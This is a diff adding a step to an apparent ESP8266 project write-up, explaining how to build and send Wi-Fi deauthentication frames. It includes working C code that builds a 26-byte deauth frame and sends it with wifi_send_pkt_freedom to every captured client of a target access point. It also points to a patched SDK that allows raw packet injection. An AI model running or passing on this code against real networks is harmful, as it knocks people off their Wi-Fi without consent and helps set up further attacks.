@@ -190,6 +190,35 @@ void sniffer_function(uint8_t *buf, uint16_t len) {
 
 ### Step 3. Building and sending the deauth packet
 
+After aquirning the MAC addresses of the device and the router i built the deauth packet using the format specified earlier.
+To send the packet i needed to use the function wifi_send_pkt_freedom() which i previously mentioned it does not run on any SDK version provided by the Arduino IDE so to be able to use it i used a version of the sdk provided by spacehuhn [link to resource] (https://wiki.spacehuhn.com/deauther/installation/compiling/)
+```
+void deauth_attack(network retea) {
+  uint8_t deauth[26];
+  // uint8_t device[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+  uint8_t first_4bytess[4] = { 0xC0, 0x00, 0x00, 0x00 };
+  uint8_t last_4bytes[4] = { 0x00, 0x00, 0x01, 0x00 };
+  memcpy(deauth, first_4bytess, 4);
+  memcpy(deauth + 22, last_4bytes, 4);
+
+  for (int i = 0; i < retea.set_dispozitive.count; i++) {
+
+    memcpy(deauth + 4, retea.set_dispozitive.bssid[i], 6);
+    memcpy(deauth + 10, retea.BSSID, 6);
+    memcpy(deauth + 16, retea.BSSID, 6);
+
+    // printPacket(deauth, sizeof(deauth));
+    int result = wifi_send_pkt_freedom(deauth, sizeof(deauth), false);
+    // if (result == 0) {
+    //   Serial.println("Pachet trimis cu succes!");
+    // } else {
+    //   Serial.printf("Eroare la trimiterea pachetului: %d\n", result);
+    // }
+  }
+}
+```
+
+
   
 
 
